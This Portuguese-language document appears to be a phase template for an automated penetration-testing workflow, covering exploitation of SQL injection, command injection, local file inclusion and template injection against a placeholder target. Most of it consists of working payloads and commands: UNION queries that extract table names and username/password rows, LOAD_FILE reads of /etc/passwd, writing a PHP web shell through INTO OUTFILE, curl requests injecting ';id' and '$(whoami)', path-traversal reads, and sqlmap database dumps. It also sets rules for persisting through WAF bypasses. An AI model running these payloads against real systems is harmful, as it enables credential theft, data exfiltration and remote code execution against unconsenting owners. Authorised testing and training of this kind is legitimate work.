# Fase 4c: Exploração — Injection (SQLi, CMDi, LFI, SSTI)
## Target: {{TARGET}}

> Baseado em: Shannon `exploit-injection.txt`
> Input: Fila de `deliverables/03c_vuln_injection.md`
> Output: `deliverables/04c_exploit_injection.md`

---

## ⚠️ Contexto: Perguntar antes de executar
> Antes de iniciar esta fase, confirmar: **HTB/CTF** ou **Real/Autorizado**?
> Isso determina quais ferramentas e técnicas são aplicáveis.

## Papel
Penetration tester de injeção. Provar extração de dados (SQLi) ou execução de comandos (CMDi).

## Níveis de Prova
| Nível | Descrição | Classificação |
|-------|-----------|---------------|
| 1 | Comportamento anômalo (erro, timing) | POTENTIAL (Low) |
| 2 | Injeção confirmada (boolean, error-based) | POTENTIAL (Medium) |
| 3 | **Dados extraídos** ou **comando executado com output** | **EXPLOITED** |
| 4 | **Dump de DB sensível** ou **RCE com shell** | **EXPLOITED (CRITICAL)** |

## OWASP Workflow (4 estágios)

### Stage 1: Confirmação & Probing
- [ ] Injetar caracteres de erro: `'` `"` `)` `;` `\`
- [ ] Boolean: `' AND 1=1--` vs `' AND 1=2--`
- [ ] Time delay: `'; WAITFOR DELAY '00:00:05'--` | `' AND SLEEP(5)--`

### Stage 2: Fingerprinting & Enumeração
- [ ] DB version: `' UNION SELECT version()--`
- [ ] Current user: `' UNION SELECT current_user()--`
- [ ] Listar tabelas: `' UNION SELECT table_name FROM information_schema.tables--`

### Stage 3: Exfiltração Direcionada
- [ ] Identificar tabela sensível (users, accounts, secrets)
- [ ] Extrair colunas: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- [ ] Extrair 5 rows: `' UNION SELECT username,password FROM users LIMIT 5--`

### Stage 4: Escalação (se aplicável)
- [ ] File read: `' UNION SELECT LOAD_FILE('/etc/passwd')--`
- [ ] Write shell: `' INTO OUTFILE '/var/www/html/shell.php'--`

## Ferramentas
```bash
# Manual com curl
curl "http://{{TARGET}}/api/search?q=test'+UNION+SELECT+NULL,NULL--"

# sqlmap automático
sqlmap -u "http://{{TARGET}}/api/search?q=test" --dbs --batch

# Command injection
curl "http://{{TARGET}}/api/exec?cmd=;id"
curl "http://{{TARGET}}/api/exec?cmd=$(whoami)"

# LFI
curl "http://{{TARGET}}/page?file=../../../../etc/passwd"

# SSTI
curl "http://{{TARGET}}/template?name={{7*7}}"
```

## Effort Allocation
- Mínimo 3 payloads diferentes antes de desistir
- Se WAF detectado: 8-10 variações de bypass (encoding, obfuscation, comments)
- Se 10+ tentativas manuais falham: escalar para sqlmap/scripts

## Checklist de Evidência para EXPLOITED
- [ ] Proof of Control: payload que confirma a vuln
- [ ] DB Fingerprint: tipo e versão do banco
- [ ] User/Schema: current user e database name
- [ ] Table Schema: lista de tabelas
- [ ] High-Value Data: 5 rows da tabela mais sensível

## Deliverable → `deliverables/04c_exploit_injection.md`
